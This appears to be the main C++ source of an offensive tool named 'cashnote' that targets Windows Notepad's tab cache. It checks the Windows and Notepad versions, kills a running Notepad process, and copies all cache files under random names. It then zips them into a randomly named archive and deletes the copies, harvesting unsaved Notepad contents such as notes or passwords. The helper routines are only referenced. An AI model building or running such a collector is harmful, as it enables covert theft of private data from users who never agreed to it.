#include <iostream>
#include <vector>
#include <string>
#include <sys/stat.h>
#include <filesystem>
#include "src/head/windowsversion_checker.h"
#include "src/head/notepadprocess_checker.h"
#include "src/head/terminateprocess.h"
#include "src/head/targetpath_builder.h"
#include "src/head/targetpath_checker.h"
#include "src/head/notepadversion_checker.h"
#include "src/head/randomcharacter_builder.h"
#include "src/head/cashfile_copy.h"
#include "src/head/gimmethecash_zip.h"
#include "src/head/findextensionfiles_delete.h"
#include "src/head/findextensionfiles_collect.h"

// g++ -o cashnote.exe cashnote.cpp src/func/*.cpp -static -s -lversion -lz -lbz2 -lz -lbz2 -lminizip -L "C:\msys64\mingw64\lib" -lz -lbz2

// ANSI escape code for colors
#define RED "\x1b[31m"
#define GREEN "\x1b[32m"
#define RESET "\x1b[0m"

const std::string ERR = RED + std::string("[!] ") + RESET;
const std::string OK = GREEN + std::string("[+] ") + RESET;

int main() {
    const char* extension = ".cash";
    const char* notepadName = "Notepad.exe";
    std::string zipRandomName = genRandomChar(15) + ".zip";
    bool condition = false;

    // Rectangles
    std::cout << " _____ _____ _____ _____ _____ _____ _____ _____ " << std::endl;
    std::cout << "|     |  _  |   __|  |  |   | |     |_   _|   __|" << std::endl;
    std::cout << "|   --|     |__   |     | | | |  |  | | | |   __|" << std::endl;
    std::cout << "|_____|__|__|_____|__|__|_|___|_____| |_| |_____|" << std::endl;
                                                     
    // check Windows version
    if (!isWindowsVersion10()) {
        std::cout << ERR << "Windows is below: 10!" << std::endl;
        std::exit(0);
    }
    std::cout << OK << "Windows is above: 10!" << std::endl;

    // check notepad version
    if (isNotepadVersion() < 12265185) {
        std::cout << ERR << "Notepad version: Old!" << std::endl;
        std::exit(0);
    }
    std::cout << OK << "Notepad version: New!" << std::endl;

    // check notepad process 
    if (isProcessRunning(notepadName)) {
        std::cout << ERR << "Notepad process: Running!" << std::endl;
        condition = true;
    } else {
        std::cout << OK << "Notepad process: Not running!" << std::endl;
        condition = false;
    }

    // ifrunning, close it
    if (condition) {
        if (terminateProcess(notepadName)) {
            std::cout << OK << "Notepad process: Terminated!" << std::endl;
        } else {
            std::cout << ERR << "Notepad process: Can't terminate!" << std::endl;
        }
    }

    // check target path
    std::string targetPath = targetPathBuilder();
    if (!isTargetPath(targetPath)) {
        std::cout << ERR << "Notepad Cache: Missing!" << std::endl;
        std::exit(0);
    }
    std::cout << OK << "Notepad Cache: Exist!" << std::endl;

    // copy cash into current directory
    std::cout << OK << "Binary file: Copied successfully!" << std::endl;
    struct stat file;
    for (const auto& entry: std::filesystem::directory_iterator(targetPath)) {
        std::filesystem::path outfilename = entry.path();
        std::string outfilename_str = outfilename.string();
        const char* path = outfilename_str.c_str();
        if (stat(path, &file) == 0 && !(file.st_mode & S_IFDIR)) {
            std::string randomName = genRandomChar(15) + extension;
            collectAllCash(randomName, path);
        }
    }

    std::vector<std::string> fileList;
    for (const auto& entry: std::filesystem::directory_iterator(".")) {
        if (std::filesystem::is_regular_file(entry) && entry.path().extension() == extension) {
            fileList.push_back(entry.path().filename().string());
        }
    }

    // Convert vector to const char* array
    std::vector<const char*> files;
    for (const auto& filename : fileList) {
        files.push_back(filename.c_str());
    }

    // Zip the cash
    std::cout << OK << "Binary file: Zipped successfully!" << std::endl;
    for (const auto& file: files) {
        (addFileToZip(zipRandomName, files));
    }

    // Delete the copied files
    deleteFilesWithExtension(".", extension);

    return 0;
}
